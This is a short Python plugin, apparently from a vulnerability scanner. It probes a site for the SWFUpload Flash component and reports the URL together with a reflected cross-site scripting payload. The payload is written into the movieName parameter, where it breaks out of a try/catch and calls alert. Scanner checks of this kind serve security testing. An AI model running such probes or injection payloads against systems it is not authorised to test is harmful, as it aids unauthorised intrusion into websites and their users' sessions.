#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/images/swfupload/swfupload.swf"
bug ="CWS    颼"
info = '/images/swfupload/swfupload.swf?movieName="]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28"xss"%29}}'

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
